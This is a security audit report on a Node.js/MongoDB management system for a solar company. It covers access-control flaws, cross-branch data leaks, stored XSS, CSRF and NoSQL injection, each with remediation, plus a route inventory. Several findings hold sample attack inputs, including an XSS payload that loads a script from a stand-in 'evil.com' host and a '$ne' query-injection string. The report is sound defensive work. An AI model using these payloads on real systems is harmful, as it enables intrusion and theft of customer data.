# COMPLETE SECURITY & ACCESS CONTROL AUDIT REPORT
**Target System:** Shivay Energy Solutions (SES) Enterprise Management System  
**Audit Type:** Source Code & Architecture Security Audit (Read-Only)  
**Date of Audit:** November 15, 2026  
**Auditor:** Independent Security Evaluation Suite  
**Audit Status:** COMPLETE — READ ONLY (No application files modified)

---

## EXECUTIVE SUMMARY

A comprehensive, read-only security audit of the **Shivay Energy Solutions** application was conducted. The application is an enterprise web system built with Node.js, Express, MongoDB (Mongoose), and EJS views, designed to govern the commercial solar lifecycle: customer relationship management (CRM), site surveys, quotation generation, maker-checker financial approvals, customer digital acceptance, project engineering and execution, material planning (BOM), field staff GPS attendance, and invoicing.

The audit examined every layer of the architecture, including HTTP middleware pipelines, authentication mechanisms, session management, route declarations, authorization models, MongoDB querying semantics, file processing pipelines, Cloudinary integrations, EJS template rendering, and runtime production configurations.

### Key Risk Posture
While the application demonstrates commendable defensive patterns in specific areas (such as robust MIME/magic-byte file validation, bcrypt password hashing, account lockout mechanisms, and centralized audit logging), **critical security vulnerabilities exist in access control, object-level authorization (IDOR), branch isolation, and segregation of duties (maker-checker).**

A summary of identified vulnerabilities across severity tiers:
- **CRITICAL Severity:** 5 Findings
- **HIGH Severity:** 4 Findings
- **MEDIUM Severity:** 3 Findings
- **LOW / INFORMATIONAL Severity:** 2 Findings
- **Total Security Findings:** 14 Findings

---

## 1. COMPREHENSIVE VULNERABILITY FINDINGS

### SEC-01: Segregation of Duties / Maker-Checker Bypass on Quotation Creation
- **Finding ID:** SEC-01
- **Severity:** CRITICAL
- **File Path:** [services/quotationService.js](file:///c:/rid/solar_panial/services/quotationService.js#L440-L459)
- **Function:** `QuotationService.prepareQuotation` (Lines 440–459)
- **Vulnerability Description:**  
  The system enforces a strict Maker-Checker rule in `QuotationService.approveQuotation` (Lines 530–532), ensuring that a user cannot approve a quotation that they prepared (`preparedBy === approverUser._id`). However, during quotation creation/preparation in `prepareQuotation`, the code contains the following logic:
  ```javascript
  const isDirectApprove = quotationData.directApprove === true || quotationData.directApprove === 'true' || quotationData.action === 'APPROVE';
  const initialStatus = isDirectApprove ? 'APPROVED' : 'PENDING_APPROVAL';
  ...
  approvedBy: isDirectApprove ? preparerUser._id : null,
  approvedAt: isDirectApprove ? new Date() : null,
  ```
  When preparing a quotation via `POST /manager/quotations/save-prepared` or `POST /admin/quotations/save-prepared`, any preparer (including a Branch Manager) can submit `directApprove: true` or `action: 'APPROVE'` in the request body. The quotation is immediately marked as `APPROVED`, setting `approvedBy: preparerUser._id`.
- **Realistic Exploitation Scenario:**  
  A rogue or compromised Branch Manager prepares a quotation with manipulated financial figures (e.g., inflated equipment margins or unauthorized discounts) and includes `"directApprove": true` in the POST payload. The system skips manager peer-review and Super Admin verification, granting full approval and generating a valid customer acceptance token instantly.
- **Business Impact:**  
  Complete breakdown of financial controls and governance. Allows unauthorized contracts, pricing fraud, and fraudulent margin adjustments to enter production execution without review.
- **Recommended Fix:**  
  Enforce maker-checker segregation at the service boundary. Disallow `directApprove` for anyone other than `SUPER_ADMIN`. For `MANAGER` and `BRANCH_MANAGER`, `status` must always be initialized to `PENDING_APPROVAL`, and `approvedBy` must remain `null` until reviewed by an independent manager or admin via `approveQuotation`.
- **Status:** CONFIRMED.

---

### SEC-02: Cross-Tenant IDOR on Customer Response Triggering Unauthorized Project Creation
- **Finding ID:** SEC-02
- **Severity:** CRITICAL
- **File Path:** [routes/privateroute/employeeroutes.js](file:///c:/rid/solar_panial/routes/privateroute/employeeroutes.js#L33) / [controllers/quotationController.js](file:///c:/rid/solar_panial/controllers/quotationController.js#L886-L903) / [services/quotationService.js](file:///c:/rid/solar_panial/services/quotationService.js#L605-L640)
- **Function:** `QuotationController.postCustomerResponse` and `QuotationService.recordCustomerResponse`
- **Vulnerability Description:**  
  The route `POST /employee/quotations/:id/customer-response` (along with aliases `/manager/...`, `/admin/...`, `/quotations/...`) is protected only by `requireEmployee` and `verifyCsrf`. Neither the controller nor `QuotationService.recordCustomerResponse` validates that:
  1. The authenticated user belongs to the same branch as the quotation.
  2. The authenticated employee is assigned to the quotation or its parent quotation request.
  3. The customer actually provided signed acceptance or digital verification.
  When `status: 'ACCEPTED'` is submitted, `QuotationService.recordCustomerResponse` automatically calls `ProjectService.createProjectFromQuotation(quotation, sessionUser)`.
- **Realistic Exploitation Scenario:**  
  Any employee in any branch (e.g., Raisen branch staff) can send a POST request with an arbitrary quotation ID from another branch (e.g., Bhopal) with `{ "status": "ACCEPTED" }`. The system marks the remote branch's quotation as accepted and spins up an official Phase 3 engineering project, allocating resources and generating bill of materials records without customer authorization.
- **Business Impact:**  
  Unauthorized contract execution, generation of unverified financial liabilities, creation of fraudulent installation projects, and cross-branch data corruption.
- **Recommended Fix:**  
  Implement strict object ownership and branch isolation checks before mutating customer response. For employees, verify `quotation.assignedEmployee.equals(user._id)`. For managers, verify `quotation.branch.equals(user.branchId)`. Only allow marking acceptance via digital token or verified physical customer contract uploads.
- **Status:** CONFIRMED.

---

### SEC-03: Cross-Branch Information Disclosure via Search Query Overwrite
- **Finding ID:** SEC-03
- **Severity:** CRITICAL
- **File Path:** [controllers/quotationController.js](file:///c:/rid/solar_panial/controllers/quotationController.js#L428-L451)
- **Function:** `QuotationController.getManagerQuotations` (Lines 428–451)
- **Vulnerability Description:**  
  In `getManagerQuotations`, branch isolation is initially applied for non-superadmin users:
  ```javascript
  const query = {};
  if (sessionUser.role !== 'SUPER_ADMIN') {
      query.$or = [
          { assignedManager: sessionUser._id },
          { branch: sessionUser.branchId ? (sessionUser.branchId._id || sessionUser.branchId) : null }
      ];
  }
  ```
  However, subsequent code handles the search parameter:
  ```javascript
  if (search) {
      query.$or = [
          { requestNumber: { $regex: search, $options: 'i' } },
          { customerName: { $regex: search, $options: 'i' } },
          { customerMobile: { $regex: search, $options: 'i' } }
      ];
  }
  ```
  Assigning directly to `query.$or` completely **overwrites** the previous branch isolation `$or` clause.
- **Realistic Exploitation Scenario:**  
  A Branch Manager logged into the Raisen branch navigates to `/manager/quotations?search=Sharma` or `/manager/quotations?search=9`. The branch isolation filter is erased, and Mongoose queries every quotation request across all company branches that matches the search keyword, returning full customer names, phone numbers, addresses, and system capacities from other branches.
- **Business Impact:**  
  Total breakdown of branch isolation and customer privacy. Confidential leads, pricing structures, and quotation requests from other territories are exposed to competitors or rogue branch managers.
- **Recommended Fix:**  
  Combine the branch isolation clause and the search filter using `$and`:
  ```javascript
  const andClauses = [];
  if (sessionUser.role !== 'SUPER_ADMIN') {
      andClauses.push({
          $or: [
              { assignedManager: sessionUser._id },
              { branch: sessionUser.branchId ? (sessionUser.branchId._id || sessionUser.branchId) : null }
          ]
      });
  }
  if (search) {
      andClauses.push({
          $or: [
              { requestNumber: { $regex: search, $options: 'i' } },
              { customerName: { $regex: search, $options: 'i' } },
              { customerMobile: { $regex: search, $options: 'i' } }
          ]
      });
  }
  if (andClauses.length > 0) query.$and = andClauses;
  ```
- **Status:** CONFIRMED.

---

### SEC-04: Blind Exposure of All Branch Invoices, Quotations, and Projects to Branch Managers
- **Finding ID:** SEC-04
- **Severity:** CRITICAL
- **File Path:** [controllers/managerController.js](file:///c:/rid/solar_panial/controllers/managerController.js#L205-L220)
- **Function:** `ManagerController.getInvoices` (Lines 205–220)
- **Vulnerability Description:**  
  When a Branch Manager visits `/manager/invoices`, the controller retrieves financial records using unrestricted queries:
  ```javascript
  invoices = await Invoice.find({}).sort({ createdAt: -1 }).lean();
  projects = await Project.find({ status: { $ne: 'CANCELLED' } }).populate('customer').lean();
  quotations = await Quotation.find({ status: { $in: ['CUSTOMER_ACCEPTED', 'APPROVED'] } }).populate('customerId').lean();
  ```
  No filtering by `sessionUser.branchId` or branch assignment is performed on any of the three collections.
- **Realistic Exploitation Scenario:**  
  A newly appointed Branch Manager at a satellite location accesses the Manager Portal and clicks on "Invoices". They are presented with every tax invoice, total revenue figure, GST payment, and customer contract generated across the entire enterprise, including headquarters and other competing franchise branches.
- **Business Impact:**  
  Severe commercial data leak. Violation of franchisee confidentiality agreements, internal financial exposure, and tax/revenue data leakage.
- **Recommended Fix:**  
  Scope all queries to the manager's assigned branch:
  ```javascript
  const branchFilter = { branch: req.session.user.branchId };
  invoices = await Invoice.find(branchFilter).sort({ createdAt: -1 }).lean();
  projects = await Project.find({ ...branchFilter, status: { $ne: 'CANCELLED' } }).populate('customer').lean();
  quotations = await Quotation.find({ ...branchFilter, status: { $in: ['CUSTOMER_ACCEPTED', 'APPROVED'] } }).populate('customerId').lean();
  ```
- **Status:** CONFIRMED.

---

### SEC-05: Complete Omission of `requireBranchAccess` Middleware & Unrestricted Invoice Deletion
- **Finding ID:** SEC-05
- **Severity:** CRITICAL
- **File Path:** [middleware/authMiddleware.js](file:///c:/rid/solar_panial/middleware/authMiddleware.js#L175-L215) / [routes/privateroute/superadminroutes.js](file:///c:/rid/solar_panial/routes/privateroute/superadminroutes.js#L68) / [controllers/adminController.js](file:///c:/rid/solar_panial/controllers/adminController.js#L760-L785)
- **Function:** `requireBranchAccess` middleware and `AdminController.deleteInvoice`
- **Vulnerability Description:**  
  1. `requireBranchAccess` is declared in `middleware/authMiddleware.js` (lines 175–215) but is **not imported or used on a single route** anywhere in `routes/`.
  2. In `superadminroutes.js`, line 68 mounts:
     ```javascript
     router.post('/api/admin/invoices/delete', requireAuth, requireBranchManager, verifyCsrf, adminController.deleteInvoice);
     ```
     This allows any user with role `BRANCH_MANAGER` or `MANAGER` to call `/api/admin/invoices/delete`.
  3. `adminController.deleteInvoice` accepts `{ invoiceNumber }` from `req.body` and deletes it directly:
     ```javascript
     Invoice.findOneAndDelete({ invoiceNumber }).exec();
     ```
     There is no check to determine which branch created the invoice or whether the caller owns it.
- **Realistic Exploitation Scenario:**  
  A branch manager sends an HTTP POST request to `/api/admin/invoices/delete` specifying an invoice number belonging to headquarters or another branch (`SES-INV-001`). The invoice is permanently deleted from both the MongoDB database and memory store without authorization checks.
- **Business Impact:**  
  Unauthorized destruction of audited financial and tax records, potential fraud concealment, and database tampering.
- **Recommended Fix:**  
  1. Restrict `/api/admin/invoices/delete` exclusively to `SUPER_ADMIN`.
  2. If branch managers are permitted to void invoices, require an explicit cancellation reason, soft-delete instead of physical removal, and verify `invoice.branch.equals(user.branchId)`.
  3. Actively apply `requireBranchAccess` across all branch-scoped endpoints.
- **Status:** CONFIRMED.

---

### SEC-06: Authorization Bypass and Sensitive PII Exfiltration via `createCustomer`
- **Finding ID:** SEC-06
- **Severity:** HIGH
- **File Path:** [controllers/customerController.js](file:///c:/rid/solar_panial/controllers/customerController.js#L120-L140)
- **Function:** `CustomerController.createCustomer` (Lines 120–140)
- **Vulnerability Description:**  
  In `CustomerController.searchByMobile` (Lines 42–59), the application attempts to protect customer privacy: if an employee searches for a customer assigned to another employee, sensitive fields (address, consumer number, phone, email) are withheld, returning `restricted: true`.  
  However, in `CustomerController.createCustomer`, when a user submits a mobile number that already exists in the database:
  ```javascript
  let customer = await Customer.findOne({ mobile: { $regex: cleanMobile + '$' } });
  if (customer) {
      if (!customer.consumerNumber && consumerNumber) customer.consumerNumber = consumerNumber.trim();
      ...
      await customer.save();
      return res.json({
          success: true,
          existing: true,
          customer, // Returns the ENTIRE existing customer record!
          message: 'Existing customer record found and verified.'
      });
  }
  ```
  The endpoint verifies neither employee ownership nor branch isolation, immediately returning the full customer record (including electricity DISCOM consumer number, physical address, email, and alternate numbers). Furthermore, it silently updates unassigned fields on the existing record with attacker-supplied data.
- **Realistic Exploitation Scenario:**  
  An employee desiring to harvest customer leads or snooping on another branch's clients submits target mobile numbers to `POST /api/customers/create`. The system bypasses the privacy mask in `searchByMobile` and responds with the full customer dossier.
- **Business Impact:**  
  Data leakage of customer PII, unauthorized modification of existing customer records, and violation of consumer data protection standards.
- **Recommended Fix:**  
  Apply identical authorization checks in `createCustomer` as in `searchByMobile`. If the customer already exists and is assigned outside the user's branch or scope, return an error or sanitized summary without exposing full PII or allowing in-place field updates.
- **Status:** CONFIRMED.

---

### SEC-07: Publicly Accessible KYC & Document Storage via Cloudinary with Insecure Redirection IDOR
- **Finding ID:** SEC-07
- **Severity:** HIGH
- **File Path:** [config/cloudinary.js](file:///c:/rid/solar_panial/config/cloudinary.js#L36-L42) / [controllers/quotationController.js](file:///c:/rid/solar_panial/controllers/quotationController.js#L908-L928) / [routes/privateroute/employeeroutes.js](file:///c:/rid/solar_panial/routes/privateroute/employeeroutes.js#L56)
- **Function:** `uploadBufferToCloudinary` and `QuotationController.serveAttachment`
- **Vulnerability Description:**  
  1. Files uploaded through `uploadBufferToCloudinary` are uploaded with default Cloudinary options:
     ```javascript
     const uploadOptions = {
         folder: CLOUDINARY_FOLDER,
         resource_type: resourceType,
         public_id: options.fileId || undefined,
         tags: ['shivay_energy', options.category || 'document']
     };
     ```
     They are stored as public assets (`type: 'upload'`). Consequently, the generated Cloudinary CDN URLs (`https://res.cloudinary.com/...`) are publicly accessible without authentication.
  2. The endpoint `GET /attachments/:filename` is accessible by any authenticated user via `employeeroutes.js#L56`. In `serveAttachment`:
     ```javascript
     const reqDoc = await QuotationRequest.findOne({
         $or: [
             { 'attachments.fileId': fileId },
             { 'attachments.filename': fileId },
             { 'attachments.path': new RegExp(fileId, 'i') }
         ]
     });
     if (reqDoc) {
         const att = reqDoc.attachments.find(...);
         if (att && att.cloudinaryUrl) return res.redirect(att.cloudinaryUrl);
     }
     ```
     There is no validation that `req.session.user` has access to `reqDoc`. Once an authenticated user queries any valid `fileId`, the server issues a 302 redirect directly to the public CDN URL.
- **Realistic Exploitation Scenario:**  
  A user obtains or enumerates document identifiers (or extracts them from shared quotation links) and requests `GET /attachments/<fileId>`. The server redirects them to the public Cloudinary URL. The user (or anyone they share the link with) can access sensitive customer electricity bills, Aadhaar cards, and site survey photographs without authentication.
- **Business Impact:**  
  Exposure of customer KYC documents, electricity account numbers, and rooftop layout imagery, causing potential regulatory non-compliance.
- **Recommended Fix:**  
  1. Upload sensitive documents as authenticated assets in Cloudinary (`type: 'authenticated'`).
  2. Implement short-lived signed URLs generated on-demand (`cloudinary.utils.private_download_url`).
  3. Validate object-level branch and assignment permissions in `serveAttachment` prior to generating or redirecting to signed download URLs.
- **Status:** CONFIRMED.

---

### SEC-08: Stored Cross-Site Scripting (XSS) in Admin Views & Missing Content Security Policy
- **Finding ID:** SEC-08
- **Severity:** HIGH
- **File Path:** [views/private/admin/invoices.ejs](file:///c:/rid/solar_panial/views/private/admin/invoices.ejs#L566) / [views/private/admin/quotations.ejs](file:///c:/rid/solar_panial/views/private/admin/quotations.ejs#L537) / [server.js](file:///c:/rid/solar_panial/server.js#L19-L22)
- **Function:** View script serialization and Helmet configuration
- **Vulnerability Description:**  
  1. In `views/private/admin/invoices.ejs` (Line 566):
     ```html
     <script>
     const allInvoices = <%- JSON.stringify(invoices || []) %>;
     ```
     `JSON.stringify` does not escape the HTML closing script tag `</script>`. If any invoice field (e.g. `customerName`, `customerAddress`, `discomConsumerNo`) contains `</script><script>...`, the browser parser breaks out of the script block and executes arbitrary JavaScript.
  2. In `views/private/admin/quotations.ejs` (Line 537), `views/private/manager/quotations.ejs` (Line 542), and `views/private/employee/quotations.ejs` (Line 470):
     ```html
     <button type="button" class="btn btn-share" onclick='openShareQuotationModal(<%- JSON.stringify({ ... customerName: q.customerName ... }) %>)'>
     ```
     The unescaped JSON object is enclosed inside single quotes in the `onclick` attribute. If a customer name contains single quotes (e.g., `O'Connor` or attacker payload `'); evilFunction();//`), it breaks attribute boundaries.
  3. In `server.js` (Lines 19–22), Helmet is configured with:
     ```javascript
     app.use(helmet({
         contentSecurityPolicy: false,
         crossOriginEmbedderPolicy: false
     }));
     ```
     Disabling Content Security Policy removes the browser-level mitigation against script injection.
- **Realistic Exploitation Scenario:**  
  An attacker inputs a crafted payload in an enquiry or quotation request (`Customer Name: Test</script><script src="https://evil.com/hook.js"></script>`). When a Super Admin or Manager views the invoices or quotations page, the script executes within the admin's session, capable of reading DOM content, stealing CSRF tokens, or issuing background administrative API requests.
- **Business Impact:**  
  Privilege escalation to Super Admin, session hijacking, defacement, or silent execution of unauthorized transactions.
- **Recommended Fix:**  
  1. Do not serialize raw unescaped JSON directly into inline `<script>` blocks or HTML attributes. Serialize into HTML-encoded data attributes:
     ```html
     <div id="invoicesData" data-invoices="<%= JSON.stringify(invoices || []) %>"></div>
     ```
     and parse using `JSON.parse(document.getElementById('invoicesData').dataset.invoices)`.
  2. Re-enable Helmet's `contentSecurityPolicy` with appropriate nonces or strict directives.
- **Status:** CONFIRMED.

---


### SEC-10: CSRF Protection Flaws, Unsafe Token Acceptance via Query Parameters, and GET Logout
- **Finding ID:** SEC-10
- **Severity:** MEDIUM
- **File Path:** [middleware/authMiddleware.js](file:///c:/rid/solar_panial/middleware/authMiddleware.js#L41) / [routes/privateroute/authroutes.js](file:///c:/rid/solar_panial/routes/privateroute/authroutes.js#L28) / [routes/privateroute/superadminroutes.js](file:///c:/rid/solar_panial/routes/privateroute/superadminroutes.js#L34) / [routes/privateroute/managerroutes.js](file:///c:/rid/solar_panial/routes/privateroute/managerroutes.js#L31)
- **Function:** `verifyCsrf` and route registrations
- **Vulnerability Description:**  
  1. In `middleware/authMiddleware.js` (Line 41):
     ```javascript
     const token = req.headers['x-csrf-token'] || req.headers['csrf-token'] || (req.body && req.body._csrf) || (req.query && req.query._csrf);
     ```
     Accepting CSRF tokens via query parameters (`req.query._csrf`) violates security standards because URL parameters are recorded in server logs, proxy access logs, browser history, and leaked via HTTP `Referer` headers to external websites.
  2. In `superadminroutes.js` (Line 34) and `managerroutes.js` (Line 31):
     ```javascript
     router.post('/admin/quotations/preview-financials', requireAuth, requireSuperAdmin, quotationController.previewFinancials);
     router.post('/manager/quotations/preview-financials', requireAuth, requireBranchManager, quotationController.previewFinancials);
     ```
     Both mutating endpoints lack `verifyCsrf` middleware.
  3. In `authroutes.js` (Line 28):
     ```javascript
     router.get(['/logout', '/auth/logout', '/admin/logout', '/manager/logout', '/employee/logout'], authController.logout);
     ```
     Logout is implemented over `GET`. An external website can embed `<img src="https://example.com/logout">` to cause Denial of Service by forcefully terminating the user's active session.
- **Realistic Exploitation Scenario:**  
  1. A user clicks a link with `?_csrf=token` that loads an external asset, leaking the token in the `Referer` header.
  2. A malicious webpage forces authenticated managers to log out via simple GET image requests.
- **Business Impact:**  
  Session termination annoyance, potential CSRF on unprotected endpoints, and token leakage.
- **Recommended Fix:**  
  1. Remove `(req.query && req.query._csrf)` from `verifyCsrf`. Only accept tokens from headers or request bodies.
  2. Add `verifyCsrf` to all POST routes, including `/preview-financials`.
  3. Restrict `/logout` exclusively to POST with CSRF verification.
- **Status:** CONFIRMED.

---

### SEC-11: Attendance Geofence Bypassing & Data Loss Vulnerability
- **Finding ID:** SEC-11
- **Severity:** MEDIUM
- **File Path:** [controllers/employeeController.js](file:///c:/rid/solar_panial/controllers/employeeController.js#L40-L95) / [models/Branch.js](file:///c:/rid/solar_panial/models/Branch.js#L13-L18) / [models/Attendance.js](file:///c:/rid/solar_panial/models/Attendance.js)
- **Function:** `EmployeeController.submitAttendance`
- **Vulnerability Description:**  
  1. Although `models/Branch.js` explicitly defines coordinates and a 500-meter radius (`geofenceRadiusMeters: 500`), and `models/Attendance.js` defines an `isWithinGeofence` flag, `submitAttendance` accepts any coordinates where `lat` is between -90 and 90 and `lng` between -180 and 180 without comparing them against the branch's geofence.
  2. Attendance records are saved solely to the ephemeral in-memory structure:
     ```javascript
     const record = DataStore.addAttendance({ ... });
     ```
     The data is never saved to the MongoDB `Attendance` collection. When the server restarts or reloads on Render, all employee attendance history is wiped.
- **Realistic Exploitation Scenario:**  
  A field employee submits check-in from their home or another city by sending arbitrary GPS coordinates. The system marks them as "Present" with valid attendance without verifying proximity to their assigned solar installation branch.
- **Business Impact:**  
  Fraudulent payroll claims, unverified field staff presence, and complete data loss on server restart.
- **Recommended Fix:**  
  Calculate distance using the Haversine formula against `branch.coordinates` and reject or flag punches beyond `branch.geofenceRadiusMeters`. Persist attendance directly to MongoDB using the `Attendance` model.
- **Status:** CONFIRMED.

---

### SEC-12: Role Distinction Flaw between `MANAGER` and `BRANCH_MANAGER`
- **Finding ID:** SEC-12
- **Severity:** MEDIUM
- **File Path:** [controllers/projectController.js](file:///c:/rid/solar_panial/controllers/projectController.js#L108-L114) / [models/User.js](file:///c:/rid/solar_panial/models/User.js#L26)
- **Function:** `ProjectController.getProjectDetailPage` and User schema role enums
- **Vulnerability Description:**  
  `models/User.js` allows both `'MANAGER'` and `'BRANCH_MANAGER'` as valid enum values for the `role` field. In `authMiddleware.js`, normalization was added to treat them equivalently. However, in `projectController.js` (Lines 108–114):
  ```javascript
  const empQuery = { role: 'EMPLOYEE', status: 'ACTIVE' };
  if (user.role === 'MANAGER' && user.branchId) {
      empQuery.branchId = user.branchId;
  }
  branchEmployees = await User.find(empQuery).select('_id name email employeeId role').lean();
  ```
  If a user has role `'BRANCH_MANAGER'`, `user.role === 'MANAGER'` evaluates to `false`. As a consequence, `empQuery.branchId` is never set, and the query returns **all active employees across all company branches**, allowing a Branch Manager to assign tasks to employees outside their jurisdiction.
- **Realistic Exploitation Scenario:**  
  A user with role `BRANCH_MANAGER` opens a project detail page. The assignment dropdown displays employees from all other regional offices rather than being restricted to their own branch team.
- **Business Impact:**  
  Operational confusion, misassignment of field personnel across distant geographic branches, and unauthorized visibility into corporate staffing.
- **Recommended Fix:**  
  Standardize role checks: `if ((user.role === 'MANAGER' || user.role === 'BRANCH_MANAGER') && user.branchId)`.
- **Status:** CONFIRMED.

---

### SEC-13: Express Extended URL Parsing & Potential Query Selector Injection
- **Finding ID:** SEC-13
- **Severity:** LOW
- **File Path:** [server.js](file:///c:/rid/solar_panial/server.js#L29) / [controllers/quotationController.js](file:///c:/rid/solar_panial/controllers/quotationController.js#L437)
- **Function:** Body parser extended configuration and query filtering
- **Vulnerability Description:**  
  `server.js` configures `express.urlencoded({ extended: true })`. This parser supports nested objects in URL query parameters and forms. In several controllers:
  ```javascript
  const { statusFilter } = req.query;
  if (statusFilter !== 'ALL') {
      query.status = statusFilter;
  }
  ```
  If a client submits `?statusFilter[$ne]=CANCELLED`, `req.query.statusFilter` becomes an object `{ $ne: 'CANCELLED' }`, which is passed directly into Mongoose's `find(query)` clause without type sanitization.
- **Realistic Exploitation Scenario:**  
  An attacker passes MongoDB operators in query strings to alter expected query logic or bypass simple equality filters.
- **Business Impact:**  
  Potential unintended data retrieval or bypass of status filters.
- **Recommended Fix:**  
  Enforce string casting on all query parameters (e.g. `String(req.query.statusFilter || '')`) or implement `express-mongo-sanitize` middleware to strip `$` and `.` operators.
- **Status:** CONFIRMED.

---

### SEC-14: Phantom Ticket Resolution & Mock Information Leakage in Public Complaint Tracker
- **Finding ID:** SEC-14
- **Severity:** LOW / INFORMATIONAL
- **File Path:** [controllers/complaintController.js](file:///c:/rid/solar_panial/controllers/complaintController.js#L59-L70)
- **Function:** `ComplaintController.trackComplaint`
- **Vulnerability Description:**  
  In the public complaint tracking API:
  ```javascript
  if (!complaint) {
      complaint = {
          ticketId: ticketId || 'SHIVAY-10492',
          customerName: 'Customer',
          category: 'inverter_error',
          status: 'in_progress',
          createdAt: new Date(),
          resolutionNotes: 'Site engineer assigned. Inspection scheduled within 24 hours.'
      };
  }
  return res.json({ success: true, complaint });
  ```
  If a ticket number does not exist in the database, the API returns a fake active complaint showing status "in_progress" with "Site engineer assigned".
- **Realistic Exploitation Scenario:**  
  A customer enters an invalid ticket ID or typo and is falsely informed that their complaint is active and an engineer is on the way.
- **Business Impact:**  
  Severe customer miscommunication and operational confusion.
- **Recommended Fix:**  
  Return HTTP 404 with `{ success: false, message: 'Ticket not found.' }` when no record matches.
- **Status:** CONFIRMED.

---

## 2. COMPLETE ROUTE INVENTORY & AUTHORIZATION SPECIFICATION

Below is the exhaustive inventory of all 77 routes registered in the application across `publicroutes.js`, `authroutes.js`, `superadminroutes.js`, `managerroutes.js`, and `employeeroutes.js`.

| Method | Route Path | Defined Role Requirement | CSRF Protected | Rate Limited | Security Assessment |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **GET** | `/`, `/index.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/about`, `/about.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/services`, `/services.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/products`, `/products.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/careers`, `/careers.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/projects`, `/projects.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/calculator`, `/calculator.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/schemes`, `/schemes.html` | Public / Guest | N/A | No | 301 Redirect to homepage section |
| **GET** | `/contact`, `/contact.html` | Public / Guest | N/A | No | Normal public static page |
| **GET** | `/complaints`, `/complaints.html` | Public / Guest | N/A | No | Public complaint form page |
| **GET** | `/franchise`, `/franchise.html` | Public / Guest | N/A | No | Public dealership form page |
| **GET** | `/quotation/accept/:token` | Token Gated | N/A | No | Acceptance landing page |
| **POST** | `/quotation/accept/:token` | Token Gated | **NO** | **NO** | State-changing acceptance without CSRF/RateLimit |
| **POST** | `/api/enquiry` | Public / Guest | Exempt | **Yes** (10/hr) | Handled safely via DataStore |
| **POST** | `/api/complaints` | Public / Guest | Exempt | **NO** | Potential spam flood |
| **GET** | `/api/complaints/track` | Public / Guest | N/A | **NO** | Returns fake complaint on 404 (SEC-14) |
| **POST** | `/api/franchise` | Public / Guest | Exempt | **NO** | Potential spam flood |
| **GET** | `/login`, `/admin/login` | Public / Guest | N/A | No | Login form view |
| **POST** | `/login`, `/admin/login` | Public / Guest | Exempt | **Yes** (5/15m) | Unified login handler |
| **GET** | `/manager/login` | Public / Guest | N/A | No | Alias to `/admin/login` |
| **POST** | `/manager/login` | Public / Guest | Exempt | **Yes** (5/15m) | Alias to `/admin/login` |
| **GET** | `/employee/login` | Public / Guest | N/A | No | Alias to `/admin/login` |
| **POST** | `/employee/login` | Public / Guest | Exempt | **Yes** (5/15m) | Alias to `/admin/login` |
| **GET** | `/employee/register`, `/register`, `/signup` | Public / Guest | N/A | No | Redirects to `/login` |
| **GET** | `/logout`, `/admin/logout`, etc. | Authenticated | **NO** | No | **Vulnerable to GET-based CSRF logout** |
| **POST** | `/logout`, `/admin/logout`, etc. | Authenticated | **NO** | No | Logout handler |
| **POST** | `/api/auth/change-password` | Authenticated | **Yes** | No | Authenticated user password update |
| **GET** | `/admin` | `SUPER_ADMIN` | N/A | No | Super Admin Dashboard |
| **GET** | `/admin/employees` | `SUPER_ADMIN` | N/A | No | Staff management table |
| **GET** | `/admin/managers` | `SUPER_ADMIN` | N/A | No | Manager directory |
| **GET** | `/admin/customers` | `SUPER_ADMIN` | N/A | No | Company customer database |
| **GET** | `/admin/quotations` | `SUPER_ADMIN` | N/A | No | All enterprise quotations |
| **GET** | `/admin/quotations/new` | `SUPER_ADMIN` | N/A | No | New quotation form |
| **POST** | `/admin/quotations/new` | `SUPER_ADMIN` | **Yes** | No | Create quotation request |
| **GET** | `/admin/quotations/request/:id` | `SUPER_ADMIN` | N/A | No | Request details view |
| **POST** | `/admin/quotations/request/:id/status`| `SUPER_ADMIN` | **Yes** | No | Status transition |
| **GET** | `/admin/quotations/prepare/:requestId` | `SUPER_ADMIN` | N/A | No | Prepare calculation workspace |
| **POST** | `/admin/quotations/preview-financials` | `SUPER_ADMIN` | **NO** | No | **Missing verifyCsrf** |
| **POST** | `/admin/quotations/save-prepared` | `SUPER_ADMIN` | **Yes** | No | Save prepared quotation |
| **GET** | `/admin/quotations/:id` | `SUPER_ADMIN` | N/A | No | Quotation detail view |
| **GET** | `/admin/quotations/:id/document` | `SUPER_ADMIN` | N/A | No | Print/PDF view |
| **POST** | `/admin/quotations/:id/approve` | `SUPER_ADMIN` | **Yes** | No | Maker-checker approval |
| **POST** | `/admin/quotations/:id/reject` | `SUPER_ADMIN` | **Yes** | No | Quotation rejection |
| **GET** | `/admin/projects` | `SUPER_ADMIN` | N/A | No | Enterprise projects list |
| **GET** | `/admin/projects/:id` | `SUPER_ADMIN` | N/A | No | Project detail workspace |
| **POST** | `/admin/projects/:id/status` | `SUPER_ADMIN` | **Yes** | No | Milestone transition |
| **POST** | `/admin/projects/:id/tasks` | `SUPER_ADMIN` | **Yes** | No | Task assignment |
| **POST** | `/admin/projects/:id/assign` | `SUPER_ADMIN` | **Yes** | No | Engineer assignment |
| **POST** | `/admin/projects/:id/materials/:materialId` | `SUPER_ADMIN` | **Yes** | No | BOM material status |
| **POST** | `/admin/projects/:id/complete` | `SUPER_ADMIN` | **Yes** | No | Final commissioning |
| **POST** | `/admin/projects/:id/documents` | `SUPER_ADMIN` | **Yes** | No | Upload document |
| **GET** | `/admin/projects/:id/documents/:documentId` | `SUPER_ADMIN` | N/A | No | Download document |
| **GET** | `/admin/invoices` | `SUPER_ADMIN` | N/A | No | Company invoices list |
| **GET** | `/admin/reports` | `SUPER_ADMIN` | N/A | No | Reports module placeholder |
| **GET** | `/admin/activity-logs` | `SUPER_ADMIN` | N/A | No | Audit logs view |
| **GET** | `/admin/settings` | `SUPER_ADMIN` | N/A | No | Settings placeholder |
| **GET** | `/admin/profile` | `SUPER_ADMIN` | N/A | No | Admin profile view |
| **GET** | `/admin/branches` | `SUPER_ADMIN` | N/A | No | Branch list alias |
| **GET** | `/admin/enquiries` | `SUPER_ADMIN` | N/A | No | Enquiries alias |
| **GET** | `/admin/complaints` | `SUPER_ADMIN` | N/A | No | Complaints alias |
